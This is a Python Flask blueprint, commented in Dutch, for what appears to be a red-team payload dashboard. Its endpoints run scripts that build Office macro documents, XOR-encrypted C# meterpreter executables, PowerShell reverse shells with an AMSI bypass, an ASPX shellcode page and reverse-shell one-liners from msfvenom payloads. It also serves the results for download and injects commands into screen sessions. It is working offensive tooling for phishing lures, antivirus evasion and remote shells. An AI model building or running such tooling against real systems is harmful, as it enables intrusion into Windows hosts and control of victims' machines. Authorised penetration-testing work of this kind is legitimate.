"""Blueprint voor payload generatie via de Flask dashboard.

Ondersteunt meerdere generators (macro, meterpreter, meterpreter2) die
elk een CLI script aanroepen als subprocess met msfvenom shellcode generatie.
"""

import os
import subprocess
import sys
import tempfile
import threading
import time
import uuid
from collections import deque
from pathlib import Path

from flask import Blueprint
from flask import abort
from flask import current_app
from flask import jsonify
from flask import render_template
from flask import request
from flask import send_file
from werkzeug.utils import secure_filename


macro_bp = Blueprint("macro_bp", __name__, template_folder="html", static_folder="static")


_ALLOWED_LOCAL_IPS = {"127.0.0.1", "::1"}
_MAX_OUTPUT_LINES = 500
_MAX_RUNTIME_SECONDS = 600

_RUNS = {}
_RUNS_LOCK = threading.Lock()


# ---------------------------------------------------------------------------
# Generator configuratie
# ---------------------------------------------------------------------------

_MACRO_PAYLOADS = [
    "windows/meterpreter/reverse_https",
    "windows/meterpreter/reverse_tcp",
    "windows/x64/meterpreter/reverse_https",
    "windows/x64/meterpreter/reverse_tcp",
    "windows/shell_reverse_tcp",
    "windows/x64/shell_reverse_tcp",
]

_METERPRETER_PAYLOADS = [
    "windows/x64/meterpreter/reverse_https",
    "windows/x64/meterpreter/reverse_tcp",
    "windows/meterpreter/reverse_https",
    "windows/meterpreter/reverse_tcp",
    "windows/x64/shell_reverse_tcp",
    "windows/shell_reverse_tcp",
]

_POWERSHELL_PAYLOADS = [
    "windows/x64/custom/reverse_winhttps",
    "windows/x64/meterpreter/reverse_https",
    "windows/x64/meterpreter/reverse_tcp",
    "windows/x64/meterpreter/reverse_winhttps",
    "windows/meterpreter/reverse_https",
    "windows/meterpreter/reverse_tcp",
    "windows/x64/shell_reverse_tcp",
    "windows/shell_reverse_tcp",
]

# Bekende generators en hun scripts
_GENERATORS = {
    "macro": {
        "label": "Office Macro Generator",
        "script": "macro.py",
        "template": "macro.html",
        "payloads": _MACRO_PAYLOADS,
    },
    "meterpreter": {
        "label": "Meterpreter (XOR C#)",
        "script": "meterpreter.py",
        "template": "meterpreter.html",
        "payloads": _METERPRETER_PAYLOADS,
    },
    "meterpreter2": {
        "label": "Meterpreter v2 (msfvenom XOR C#)",
        "script": "meterpreter2.py",
        "template": "meterpreter2.html",
        "payloads": _METERPRETER_PAYLOADS,
    },
    "macro2": {
        "label": "Office Macro v2 (LURI)",
        "script": "macro2.py",
        "template": "macro2.html",
        "payloads": _MACRO_PAYLOADS,
    },
}

_ALLOWED_TEMPLATE_EXTENSIONS = {".docx", ".xlsx"}


# ---------------------------------------------------------------------------
# Gedeelde helpers
# ---------------------------------------------------------------------------

def _is_local_request():
    return request.remote_addr in _ALLOWED_LOCAL_IPS


def _ensure_access():
    if not _is_local_request():
        abort(403)


def _validate_port(lport):
    """Valideer poortnummer. Geeft (int, None) of (None, error_msg)."""
    try:
        port_num = int(lport)
        if not (1 <= port_num <= 65535):
            raise ValueError
        return port_num, None
    except ValueError:
        return None, "Ongeldig poortnummer"


def _run_generator_task(run_id, cmd, output_paths=None):
    """Draai een generator script als subprocess in een achtergrond thread.

    output_paths: lijst van bestanden die als download beschikbaar moeten zijn
                  na succesvolle run. Eerste bestaande bestand wordt aangeboden.
    """
    started_at = int(time.time())
    output = deque(maxlen=_MAX_OUTPUT_LINES)

    with _RUNS_LOCK:
        _RUNS[run_id] = {
            "id": run_id,
            "status": "running",
            "started_at": started_at,
            "finished_at": None,
            "return_code": None,
            "output": output,
            "output_paths": output_paths or [],
        }

    env = os.environ.copy()
    try:
        proc = subprocess.Popen(
            cmd,
            cwd=str(Path.cwd()),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            shell=False,
            env=env,
        )
    except Exception as exc:
        with _RUNS_LOCK:
            _RUNS[run_id]["status"] = "failed"
            _RUNS[run_id]["finished_at"] = int(time.time())
            _RUNS[run_id]["return_code"] = -1
            _RUNS[run_id]["output"].append(f"Fout bij starten: {exc}")
        return

    deadline = time.time() + _MAX_RUNTIME_SECONDS
    try:
        while True:
            if proc.stdout is not None:
                line = proc.stdout.readline()
                if line:
                    output.append(line.rstrip("\n"))

            if proc.poll() is not None:
                break

            if time.time() > deadline:
                proc.kill()
                output.append(f"Proces afgebroken na {_MAX_RUNTIME_SECONDS}s timeout")
                break

            time.sleep(0.03)

        if proc.stdout is not None:
            for line in proc.stdout:
                output.append(line.rstrip("\n"))

        return_code = proc.returncode if proc.returncode is not None else -1
        status = "success" if return_code == 0 else "failed"

        with _RUNS_LOCK:
            _RUNS[run_id]["status"] = status
            _RUNS[run_id]["finished_at"] = int(time.time())
            _RUNS[run_id]["return_code"] = return_code
    except Exception as exc:
        with _RUNS_LOCK:
            _RUNS[run_id]["status"] = "failed"
            _RUNS[run_id]["finished_at"] = int(time.time())
            _RUNS[run_id]["return_code"] = -1
            _RUNS[run_id]["output"].append(f"Runner fout: {exc}")


def _find_download_path(run):
    """Zoek het eerste bestaande bestand uit de output_paths lijst."""
    for path in run.get("output_paths", []):
        if os.path.isfile(path):
            return path
    return None


# ---------------------------------------------------------------------------
# Dashboard routes — elk generator type krijgt z'n eigen pagina
# ---------------------------------------------------------------------------

@macro_bp.route("/dashboard/macro", methods=["GET"])
def macro_dashboard():
    _ensure_access()
    gen = _GENERATORS["macro"]
    return render_template(gen["template"], payloads=gen["payloads"])


@macro_bp.route("/dashboard/meterpreter", methods=["GET"])
def meterpreter_dashboard():
    _ensure_access()
    gen = _GENERATORS["meterpreter"]
    return render_template(gen["template"], payloads=gen["payloads"])


@macro_bp.route("/dashboard/meterpreter2", methods=["GET"])
def meterpreter2_dashboard():
    _ensure_access()
    gen = _GENERATORS["meterpreter2"]
    return render_template(gen["template"], payloads=gen["payloads"])


@macro_bp.route("/dashboard/macro2", methods=["GET"])
def macro2_dashboard():
    _ensure_access()
    gen = _GENERATORS["macro2"]
    return render_template(gen["template"], payloads=gen["payloads"])


@macro_bp.route("/dashboard/powershell", methods=["GET"])
def powershell_dashboard():
    _ensure_access()
    return render_template("powershell.html", payloads=_POWERSHELL_PAYLOADS)


@macro_bp.route("/dashboard/methaspx", methods=["GET"])
def methaspx_dashboard():
    _ensure_access()
    return render_template("methaspx.html", payloads=_METERPRETER_PAYLOADS)


@macro_bp.route("/dashboard/invokeshellcode", methods=["GET"])
def invokeshellcode_dashboard():
    _ensure_access()
    return render_template("invokeshellcode.html")


@macro_bp.route("/dashboard/reverseshells", methods=["GET"])
def reverseshells_dashboard():
    _ensure_access()
    return render_template("reverseshells.html")


# ---------------------------------------------------------------------------
# Generate endpoints — per generator type
# ---------------------------------------------------------------------------

@macro_bp.route("/api/macro/generate", methods=["POST"])
def macro_generate():
    """Start macro generatie."""
    _ensure_access()

    lhost = request.form.get("lhost", "").strip()
    if not lhost:
        return jsonify({"error": "lhost is verplicht"}), 400

    lport = request.form.get("lport", "443").strip() or "443"
    _, err = _validate_port(lport)
    if err:
        return jsonify({"error": err}), 400

    payload = request.form.get("payload", "windows/meterpreter/reverse_https").strip()
    if payload not in _GENERATORS["macro"]["payloads"]:
        return jsonify({"error": f"Onbekend payload type: {payload}"}), 400

    cmd = [sys.executable, "macro.py", lhost, lport, payload]
    output_paths = []

    template_file = request.files.get("template")
    if template_file and template_file.filename:
        filename = secure_filename(template_file.filename)
        ext = os.path.splitext(filename)[1].lower()

        if ext not in _ALLOWED_TEMPLATE_EXTENSIONS:
            return jsonify({"error": f"Alleen .docx en .xlsx bestanden: {ext}"}), 400

        temp_dir = tempfile.mkdtemp(prefix="ib_macro_")
        template_path = os.path.join(temp_dir, filename)
        template_file.save(template_path)

        out_ext = ".docm" if ext == ".docx" else ".xlsm"
        out_name = os.path.splitext(filename)[0] + out_ext
        output_path = os.path.join(temp_dir, out_name)
        output_paths.append(output_path)

        cmd.extend(["--template", template_path, "-o", output_path])

    run_id = str(uuid.uuid4())
    thread = threading.Thread(
        target=_run_generator_task,
        args=(run_id, cmd, output_paths),
        daemon=True,
    )
    thread.start()
    return jsonify({"run_id": run_id, "has_template": bool(output_paths)})


@macro_bp.route("/api/macro2/generate", methods=["POST"])
def macro2_generate():
    """Start macro2 generatie (VBA macro met LURI ondersteuning)."""
    _ensure_access()

    lhost = request.form.get("lhost", "").strip()
    if not lhost:
        return jsonify({"error": "lhost is verplicht"}), 400

    lport = request.form.get("lport", "443").strip() or "443"
    _, err = _validate_port(lport)
    if err:
        return jsonify({"error": err}), 400

    luri = request.form.get("luri", "/").strip() or "/"
    payload = request.form.get("payload", "windows/meterpreter/reverse_https").strip()
    if payload not in _GENERATORS["macro2"]["payloads"]:
        return jsonify({"error": f"Onbekend payload type: {payload}"}), 400

    cmd = [sys.executable, "macro2.py", lhost, lport, luri, payload]
    output_paths = []

    template_file = request.files.get("template")
    if template_file and template_file.filename:
        filename = secure_filename(template_file.filename)
        ext = os.path.splitext(filename)[1].lower()

        if ext not in _ALLOWED_TEMPLATE_EXTENSIONS:
            return jsonify({"error": f"Alleen .docx en .xlsx bestanden: {ext}"}), 400

        temp_dir = tempfile.mkdtemp(prefix="ib_macro2_")
        template_path = os.path.join(temp_dir, filename)
        template_file.save(template_path)

        out_ext = ".docm" if ext == ".docx" else ".xlsm"
        out_name = os.path.splitext(filename)[0] + out_ext
        output_path = os.path.join(temp_dir, out_name)
        output_paths.append(output_path)

        cmd.extend(["--template", template_path, "-o", output_path])

    run_id = str(uuid.uuid4())
    thread = threading.Thread(
        target=_run_generator_task,
        args=(run_id, cmd, output_paths),
        daemon=True,
    )
    thread.start()
    return jsonify({"run_id": run_id, "has_template": bool(output_paths)})


@macro_bp.route("/api/meterpreter/generate", methods=["POST"])
def meterpreter_generate():
    """Start meterpreter generatie (XOR encrypted C# shellcode + msbuild)."""
    _ensure_access()

    lhost = request.form.get("lhost", "").strip()
    if not lhost:
        return jsonify({"error": "lhost is verplicht"}), 400

    lport = request.form.get("lport", "443").strip() or "443"
    _, err = _validate_port(lport)
    if err:
        return jsonify({"error": err}), 400

    payload = request.form.get("payload", "windows/x64/meterpreter/reverse_https").strip()
    if payload not in _GENERATORS["meterpreter"]["payloads"]:
        return jsonify({"error": f"Onbekend payload type: {payload}"}), 400

    key = request.form.get("key", "").strip()

    cmd = [sys.executable, "meterpreter.py", lhost, lport, payload]
    if key:
        cmd.append(key)

    # meterpreter.py schrijft naar meuk/meth/Program.cs en bouwt met msbuild
    # Output binary: meuk/meth/bin/Debug/meth.exe
    output_paths = [
        str(Path.cwd() / "meuk" / "meth" / "bin" / "Debug" / "meth.exe"),
        str(Path.cwd() / "raw" / "meth.cs"),
    ]

    run_id = str(uuid.uuid4())
    thread = threading.Thread(
        target=_run_generator_task,
        args=(run_id, cmd, output_paths),
        daemon=True,
    )
    thread.start()
    return jsonify({"run_id": run_id})


@macro_bp.route("/api/meterpreter2/generate", methods=["POST"])
def meterpreter2_generate():
    """Start meterpreter2 generatie (msfvenom XOR encrypted C# + msbuild)."""
    _ensure_access()

    lhost = request.form.get("lhost", "").strip()
    if not lhost:
        return jsonify({"error": "lhost is verplicht"}), 400

    lport = request.form.get("lport", "443").strip() or "443"
    _, err = _validate_port(lport)
    if err:
        return jsonify({"error": err}), 400

    luri = request.form.get("luri", "/").strip() or "/"
    payload = request.form.get("payload", "windows/x64/meterpreter/reverse_https").strip()
    if payload not in _GENERATORS["meterpreter2"]["payloads"]:
        return jsonify({"error": f"Onbekend payload type: {payload}"}), 400

    cmd = [sys.executable, "meterpreter2.py", lhost, lport, luri, payload]

    # meterpreter2.py schrijft naar meuk/meth/Program.cs en bouwt met msbuild
    output_paths = [
        str(Path.cwd() / "meuk" / "meth" / "bin" / "Debug" / "meth.exe"),
        str(Path.cwd() / "raw" / "crystalmeth.cs"),
    ]

    run_id = str(uuid.uuid4())
    thread = threading.Thread(
        target=_run_generator_task,
        args=(run_id, cmd, output_paths),
        daemon=True,
    )
    thread.start()
    return jsonify({"run_id": run_id})


@macro_bp.route("/api/powershell/generate", methods=["POST"])
def powershell_generate():
    """Start powershell.py generatie (PowerShell reverse shells + AMSI bypass)."""
    _ensure_access()

    lhost = request.form.get("lhost", "").strip()
    if not lhost:
        return jsonify({"error": "lhost is verplicht"}), 400

    lport = request.form.get("lport", "443").strip() or "443"
    _, err = _validate_port(lport)
    if err:
        return jsonify({"error": err}), 400

    payload = request.form.get("payload", "windows/x64/custom/reverse_winhttps").strip()
    if payload not in _POWERSHELL_PAYLOADS:
        return jsonify({"error": f"Onbekend payload type: {payload}"}), 400

    bestand = request.form.get("bestand", "shell_443.txt").strip() or "shell_443.txt"
    # Sanitize bestandsnaam: alleen alfanumeriek, underscore, streepje, punt
    if not all(c.isalnum() or c in "_-." for c in bestand):
        return jsonify({"error": "Bestandsnaam mag alleen letters, cijfers, _, - en . bevatten"}), 400
    if ".." in bestand or "/" in bestand:
        return jsonify({"error": "Ongeldige bestandsnaam"}), 400

    luri = request.form.get("luri", "/").strip() or "/"

    bestand_path = f"http/payloads/{bestand}"

    cmd = [sys.executable, "powershell.py", lhost, lport, luri, payload, bestand_path]

    output_paths = [
        str(Path.cwd() / "http" / "payloads" / "amsi-bypass.ps1"),
        str(Path.cwd() / "http" / "payloads" / "amsi-shell.ps1"),
    ]

    run_id = str(uuid.uuid4())
    thread = threading.Thread(
        target=_run_generator_task,
        args=(run_id, cmd, output_paths),
        daemon=True,
    )
    thread.start()
    return jsonify({"run_id": run_id})


@macro_bp.route("/api/methaspx/generate", methods=["POST"])
def methaspx_generate():
    """Start methaspx.py generatie (XOR encrypted C# ASPX shellcode)."""
    _ensure_access()

    lhost = request.form.get("lhost", "").strip()
    if not lhost:
        return jsonify({"error": "lhost is verplicht"}), 400

    lport = request.form.get("lport", "443").strip() or "443"
    _, err = _validate_port(lport)
    if err:
        return jsonify({"error": err}), 400

    payload = request.form.get("payload", "windows/x64/meterpreter/reverse_tcp").strip()
    if payload not in _METERPRETER_PAYLOADS:
        return jsonify({"error": f"Onbekend payload type: {payload}"}), 400

    key = request.form.get("key", "").strip()

    cmd = [sys.executable, "methaspx.py", lhost, lport, payload]
    if key:
        cmd.append(key)

    output_paths = [
        str(Path.cwd() / "http" / "payloads" / "meth.aspx"),
    ]

    run_id = str(uuid.uuid4())
    thread = threading.Thread(
        target=_run_generator_task,
        args=(run_id, cmd, output_paths),
        daemon=True,
    )
    thread.start()
    return jsonify({"run_id": run_id})


@macro_bp.route("/api/invokeshellcode/generate", methods=["POST"])
def invokeshellcode_generate():
    """Start invoke-shellcode.py generatie (PowerShell Invoke-Shellcode)."""
    _ensure_access()

    lhost = request.form.get("lhost", "").strip()
    if not lhost:
        return jsonify({"error": "lhost is verplicht"}), 400

    lport = request.form.get("lport", "443").strip() or "443"
    _, err = _validate_port(lport)
    if err:
        return jsonify({"error": err}), 400

    luri = request.form.get("luri", "/").strip() or "/"

    cmd = [sys.executable, "invoke-shellcode.py", lhost, lport, luri]

    output_paths = [
        str(Path.cwd() / "http" / "payloads" / "invoke-shellcode.ps1"),
    ]

    run_id = str(uuid.uuid4())
    thread = threading.Thread(
        target=_run_generator_task,
        args=(run_id, cmd, output_paths),
        daemon=True,
    )
    thread.start()
    return jsonify({"run_id": run_id})


@macro_bp.route("/api/reverseshells/generate", methods=["POST"])
def reverseshells_generate():
    """Start reverseshells.sh generatie."""
    _ensure_access()

    lhost = request.form.get("lhost", "").strip()
    if not lhost:
        return jsonify({"error": "lhost is verplicht (IP of interface naam)"}), 400

    lport = request.form.get("lport", "443").strip() or "443"
    _, err = _validate_port(lport)
    if err:
        return jsonify({"error": err}), 400

    bestand = request.form.get("bestand", "shell").strip() or "shell"
    # Sanitize bestandsnaam: alleen alfanumeriek, underscore, streepje
    if not all(c.isalnum() or c in "_-" for c in bestand):
        return jsonify({"error": "Bestandsnaam mag alleen letters, cijfers, _ en - bevatten"}), 400

    cmd = ["bash", "reverseshells.sh", lhost, lport, bestand]

    # Hoofd output: http/payloads/{bestand}_{port}.txt
    output_paths = [
        str(Path.cwd() / "http" / "payloads" / f"{bestand}_{lport}.txt"),
    ]

    run_id = str(uuid.uuid4())
    thread = threading.Thread(
        target=_run_generator_task,
        args=(run_id, cmd, output_paths),
        daemon=True,
    )
    thread.start()
    return jsonify({"run_id": run_id})


# ---------------------------------------------------------------------------
# Reverse shells: bestaande bestanden ophalen
# ---------------------------------------------------------------------------

import re as _re

_RE_SHELL_FILE = _re.compile(r"^[a-zA-Z0-9_\-]+_\d+\.txt$")


@macro_bp.route("/api/reverseshells/files", methods=["GET"])
def reverseshells_files():
    """Lijst bestaande shell output .txt bestanden in http/payloads/."""
    _ensure_access()
    payloads_dir = Path.cwd() / "http" / "payloads"
    files = []
    if payloads_dir.is_dir():
        for f in sorted(payloads_dir.iterdir()):
            if f.is_file() and _RE_SHELL_FILE.match(f.name):
                files.append({"name": f.name, "size": f.stat().st_size})
    return jsonify({"files": files})


@macro_bp.route("/api/reverseshells/tools", methods=["GET"])
def reverseshells_tools():
    """Lijst tools in http/tools/ gecategoriseerd op type."""
    _ensure_access()
    tools_dir = Path.cwd() / "http" / "tools"
    ps1 = []
    exe = []
    other = []
    if tools_dir.is_dir():
        for f in sorted(tools_dir.iterdir()):
            if not f.is_file():
                continue
            name = f.name
            if name == "index.html":
                continue
            if name.endswith(".ps1"):
                ps1.append(name)
            elif name.endswith(".exe"):
                exe.append(name)
            elif name.endswith(".sh") or name.endswith(".py") or name.endswith(".bat"):
                other.append(name)
    return jsonify({"ps1": ps1, "exe": exe, "other": other})


@macro_bp.route("/api/reverseshells/payloads", methods=["GET"])
def reverseshells_payloads():
    """Lijst gegenereerde payloads in http/payloads/."""
    _ensure_access()
    payloads_dir = Path.cwd() / "http" / "payloads"
    payloads = []
    if payloads_dir.is_dir():
        for f in sorted(payloads_dir.iterdir()):
            if f.is_file() and f.name != "index.html":
                payloads.append({
                    "name": f.name,
                    "size": f.stat().st_size,
                    "url": f"/payloads/{f.name}",
                })
    return jsonify({"payloads": payloads})


@macro_bp.route("/api/reverseshells/files/<filename>", methods=["GET"])
def reverseshells_file_content(filename):
    """Lees de inhoud van een bestaand shell .txt bestand."""
    _ensure_access()
    if not _RE_SHELL_FILE.match(filename):
        abort(400)
    filepath = Path.cwd() / "http" / "payloads" / filename
    if not filepath.is_file():
        abort(404)
    return send_file(filepath, mimetype="text/plain")


# ---------------------------------------------------------------------------
# Gedeelde status en download endpoints
# ---------------------------------------------------------------------------

@macro_bp.route("/api/generate/status/<run_id>", methods=["GET"])
def generate_status(run_id):
    """Polling endpoint voor run status (gedeeld door alle generators)."""
    _ensure_access()

    with _RUNS_LOCK:
        run = _RUNS.get(run_id)
        if not run:
            return jsonify({"error": "run niet gevonden"}), 404

        result = {
            "id": run["id"],
            "status": run["status"],
            "started_at": run["started_at"],
            "finished_at": run["finished_at"],
            "return_code": run["return_code"],
            "output": list(run["output"]),
            "has_download": False,
        }

        if run["status"] == "success":
            dl_path = _find_download_path(run)
            if dl_path:
                result["has_download"] = True
                result["download_url"] = f"/api/generate/download/{run['id']}"

    return jsonify(result)


# Bewaar oude macro status URL voor backwards compat
@macro_bp.route("/api/macro/status/<run_id>", methods=["GET"])
def macro_status_compat(run_id):
    return generate_status(run_id)


@macro_bp.route("/api/generate/download/<run_id>", methods=["GET"])
def generate_download(run_id):
    """Download het gegenereerde bestand (gedeeld door alle generators)."""
    _ensure_access()

    with _RUNS_LOCK:
        run = _RUNS.get(run_id)
        if not run:
            abort(404)

    dl_path = _find_download_path(run)
    if not dl_path:
        abort(404)

    filename = os.path.basename(dl_path)
    return send_file(dl_path, as_attachment=True, download_name=filename)


# Bewaar oude macro download URL voor backwards compat
@macro_bp.route("/api/macro/download/<run_id>", methods=["GET"])
def macro_download_compat(run_id):
    return generate_download(run_id)


# ---------------------------------------------------------------------------
# Command Library — screen injectie
# ---------------------------------------------------------------------------

_RE_CMD_NAME = _re.compile(r"^[a-zA-Z0-9_\-]+$")
_RE_SCREEN_NAME = _re.compile(r"^[a-zA-Z0-9_.\-]+$")


@macro_bp.route("/dashboard/commands", methods=["GET"])
def commands_dashboard():
    """Command Library pagina."""
    _ensure_access()
    return render_template("commands.html")


@macro_bp.route("/api/commands", methods=["GET"])
def commands_list():
    """Lijst alle beschikbare commands met inhoud."""
    _ensure_access()
    commands_dir = Path.cwd() / "http" / "commands"
    commands = []
    if commands_dir.is_dir():
        for f in sorted(commands_dir.iterdir()):
            if f.is_file() and _RE_CMD_NAME.match(f.name):
                try:
                    content = f.read_text(errors="replace").strip()
                except OSError:
                    content = ""
                commands.append({"name": f.name, "content": content})
    return jsonify({"commands": commands})


@macro_bp.route("/api/commands/screens", methods=["GET"])
def commands_screens():
    """Lijst actieve screen sessies."""
    _ensure_access()
    screens = []
    try:
        result = subprocess.run(
            ["screen", "-list"],
            capture_output=True, text=True, timeout=5,
        )
        # screen -list geeft rc=1 als er sessions zijn, rc=0 als er geen zijn
        output = result.stdout + result.stderr
        for line in output.splitlines():
            line = line.strip()
            # Formaat: "12345.session_name\t(Detached)" of "(Attached)"
            if "." in line and ("Detached" in line or "Attached" in line):
                parts = line.split("\t")
                if parts:
                    full = parts[0].strip()
                    # "12345.session_name" -> session_name
                    dot_idx = full.find(".")
                    if dot_idx >= 0:
                        name = full[dot_idx + 1:]
                    else:
                        name = full
                    status = "attached" if "Attached" in line else "detached"
                    screens.append({"name": name, "full": full, "status": status})
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass
    return jsonify({"screens": screens})


@macro_bp.route("/api/commands/inject", methods=["POST"])
def commands_inject():
    """Injecteer een command in een screen sessie."""
    _ensure_access()

    payload = request.get_json(silent=True) or {}
    screen_name = (payload.get("screen") or "").strip()
    command_name = (payload.get("command") or "").strip()

    if not screen_name:
        return jsonify({"error": "Screen sessie is verplicht"}), 400
    if not _RE_SCREEN_NAME.match(screen_name):
        return jsonify({"error": "Ongeldige screen sessie naam"}), 400

    if not command_name:
        return jsonify({"error": "Command is verplicht"}), 400
    if not _RE_CMD_NAME.match(command_name):
        return jsonify({"error": "Ongeldige command naam"}), 400

    # Lees command bestand
    cmd_path = Path.cwd() / "http" / "commands" / command_name
    if not cmd_path.is_file():
        return jsonify({"error": f"Command '{command_name}' niet gevonden"}), 404

    try:
        content = cmd_path.read_text(errors="replace").strip()
    except OSError as exc:
        return jsonify({"error": f"Kan command niet lezen: {exc}"}), 500

    # Optionele find/replace op content voor injectie
    replacements = payload.get("replacements")
    if isinstance(replacements, list):
        for r in replacements:
            if isinstance(r, dict):
                find = r.get("find", "")
                replace = r.get("replace", "")
                if find:
                    content = content.replace(find, replace)

    # Injecteer in screen sessie
    try:
        result = subprocess.run(
            ["screen", "-S", screen_name, "-X", "stuff", content + "\n"],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode != 0:
            stderr = (result.stderr or "").strip()
            return jsonify({"error": f"Screen inject mislukt (rc={result.returncode}): {stderr}"}), 500
    except FileNotFoundError:
        return jsonify({"error": "screen is niet geinstalleerd"}), 500
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Screen inject timeout"}), 500

    return jsonify({"ok": True, "screen": screen_name, "command": command_name})


# ---------------------------------------------------------------------------
# Asciinema recordings — lijst en playback
# ---------------------------------------------------------------------------

_RE_REC_NAME = _re.compile(r"^[a-zA-Z0-9_.\-]+\.rec$")


@macro_bp.route("/dashboard/recordings", methods=["GET"])
def recordings_dashboard():
    """Overzicht pagina met alle asciinema recordings."""
    _ensure_access()
    return render_template("recordings.html")


@macro_bp.route("/dashboard/recordings/<filename>", methods=["GET"])
def recordings_play(filename):
    """Playback pagina voor een specifieke recording."""
    _ensure_access()
    if not _RE_REC_NAME.match(filename):
        abort(400)
    rec_path = Path.cwd() / "meuk" / "logs" / filename
    if not rec_path.is_file():
        abort(404)
    return render_template("recordings.html", play=filename)


@macro_bp.route("/api/recordings", methods=["GET"])
def recordings_list():
    """Lijst alle .rec bestanden in meuk/logs/."""
    _ensure_access()
    logs_dir = Path.cwd() / "meuk" / "logs"
    recordings = []
    if logs_dir.is_dir():
        for f in sorted(logs_dir.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True):
            if f.is_file() and f.suffix == ".rec":
                stat = f.stat()
                recordings.append({
                    "name": f.name,
                    "size": stat.st_size,
                    "mtime": int(stat.st_mtime),
                })
    return jsonify({"recordings": recordings})


@macro_bp.route("/api/recordings/<filename>", methods=["GET"])
def recordings_file(filename):
    """Serveer een .rec bestand voor de asciinema player."""
    _ensure_access()
    if not _RE_REC_NAME.match(filename):
        abort(400)
    rec_path = Path.cwd() / "meuk" / "logs" / filename
    if not rec_path.is_file():
        abort(404)
    return send_file(rec_path, mimetype="application/json")


# ---------------------------------------------------------------------------
# Screen Terminal — interactieve web-terminal voor screen sessies
# ---------------------------------------------------------------------------

_MAX_SCREEN_INPUT = 1024


@macro_bp.route("/dashboard/screen", methods=["GET"])
def screen_dashboard():
    """Screen terminal pagina."""
    _ensure_access()
    return render_template("screen.html")


@macro_bp.route("/api/screen/<name>/content", methods=["GET"])
def screen_content(name):
    """Lees screen output via hardcopy."""
    _ensure_access()

    if not _RE_SCREEN_NAME.match(name):
        return jsonify({"error": "Ongeldige screen sessie naam"}), 400

    hardcopy_path = f"/tmp/ib_screen_{name}.txt"

    try:
        result = subprocess.run(
            ["screen", "-S", name, "-p", "0", "-X", "hardcopy", hardcopy_path],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode != 0:
            stderr = (result.stderr or "").strip()
            return jsonify({"error": f"Hardcopy mislukt (rc={result.returncode}): {stderr}"}), 500
    except FileNotFoundError:
        return jsonify({"error": "screen is niet geinstalleerd"}), 500
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Screen hardcopy timeout"}), 500

    try:
        with open(hardcopy_path, "r", errors="replace") as f:
            content = f.read()
    except OSError:
        return jsonify({"error": "Kan hardcopy bestand niet lezen"}), 500

    # Strip trailing lege regels
    lines = content.rstrip("\n").split("\n")
    while lines and not lines[-1].strip():
        lines.pop()
    content = "\n".join(lines)

    return jsonify({"content": content})


@macro_bp.route("/api/screen/<name>/input", methods=["POST"])
def screen_input(name):
    """Stuur input naar een screen sessie via stuff."""
    _ensure_access()

    if not _RE_SCREEN_NAME.match(name):
        return jsonify({"error": "Ongeldige screen sessie naam"}), 400

    payload = request.get_json(silent=True) or {}
    command = payload.get("command")

    if not command or not isinstance(command, str):
        return jsonify({"error": "Command is verplicht"}), 400

    if len(command) > _MAX_SCREEN_INPUT:
        return jsonify({"error": f"Command te lang (max {_MAX_SCREEN_INPUT} tekens)"}), 400

    try:
        result = subprocess.run(
            ["screen", "-S", name, "-p", "0", "-X", "stuff", command + "\n"],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode != 0:
            stderr = (result.stderr or "").strip()
            return jsonify({"error": f"Screen input mislukt (rc={result.returncode}): {stderr}"}), 500
    except FileNotFoundError:
        return jsonify({"error": "screen is niet geinstalleerd"}), 500
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Screen input timeout"}), 500

    return jsonify({"ok": True})


_ALLOWED_SHELLS = {
    "bash": "/bin/bash",
    "sh": "/bin/sh",
    "zsh": "/bin/zsh",
}


@macro_bp.route("/api/screen/start", methods=["POST"])
def screen_start():
    """Start een nieuwe screen sessie met asciinema recording."""
    _ensure_access()

    payload = request.get_json(silent=True) or {}
    name = (payload.get("name") or "").strip()
    shell = (payload.get("shell") or "").strip()

    if not name:
        return jsonify({"error": "Sessie naam is verplicht"}), 400
    if not _RE_SCREEN_NAME.match(name):
        return jsonify({"error": "Ongeldige sessie naam"}), 400

    # Bepaal shell pad
    shell_path = None
    if shell:
        shell_path = _ALLOWED_SHELLS.get(shell)
        if not shell_path:
            return jsonify({"error": f"Ongeldige shell: {shell}"}), 400

    # Controleer of sessie al bestaat
    try:
        result = subprocess.run(
            ["screen", "-list"],
            capture_output=True, text=True, timeout=5,
        )
        output = result.stdout + result.stderr
        for line in output.splitlines():
            if f".{name}" in line and ("Detached" in line or "Attached" in line):
                return jsonify({"error": f"Sessie '{name}' bestaat al"}), 409
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass

    # Maak logs directory aan
    logs_dir = Path.cwd() / "meuk" / "logs"
    logs_dir.mkdir(parents=True, exist_ok=True)
    rec_path = str(logs_dir / f"{name}.rec")

    cmd = [
        "screen", "-dmS", name,
        "asciinema", "rec", "-q", "--overwrite",
    ]
    if shell_path:
        cmd.extend(["-c", shell_path])
    cmd.append(rec_path)

    try:
        result = subprocess.run(
            cmd,
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode != 0:
            stderr = (result.stderr or "").strip()
            return jsonify({"error": f"Screen start mislukt: {stderr}"}), 500
    except FileNotFoundError:
        return jsonify({"error": "screen of asciinema is niet geinstalleerd"}), 500
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Screen start timeout"}), 500

    return jsonify({"ok": True, "name": name, "recording": f"{name}.rec"})


@macro_bp.route("/api/screen/<name>/detach", methods=["POST"])
def screen_detach(name):
    """Detach een screen sessie zodat deze op de achtergrond blijft draaien."""
    _ensure_access()

    if not _RE_SCREEN_NAME.match(name):
        return jsonify({"error": "Ongeldige screen sessie naam"}), 400

    try:
        subprocess.run(
            ["screen", "-S", name, "-X", "detach"],
            capture_output=True, text=True, timeout=5,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    return jsonify({"ok": True})
